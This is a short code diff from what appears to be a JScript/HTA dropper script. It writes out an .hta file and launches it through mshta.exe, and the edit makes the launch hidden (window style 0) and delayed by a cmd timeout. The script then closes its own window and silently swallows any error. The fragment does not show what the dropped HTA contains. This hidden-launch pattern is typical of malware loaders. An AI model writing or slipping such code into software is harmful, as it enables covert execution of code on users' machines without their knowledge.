@@ -106,7 +106,8 @@
       st.SaveToFile(htaPath, 2); st.Close();
 
       var sh2 = new ActiveXObject('WScript.Shell');
-      sh2.Run('"' + sh2.ExpandEnvironmentStrings('%WINDIR%') + '\\System32\\mshta.exe" "' + htaPath + '"', 1, false);
+      var mshta = sh2.ExpandEnvironmentStrings('%WINDIR%') + '\\System32\\mshta.exe';
+      sh2.Run('cmd /c timeout /t 1 /nobreak >nul & "' + mshta + '" "' + htaPath + '"', 0, false);
       window.close();
     } catch (e) {}
   })();
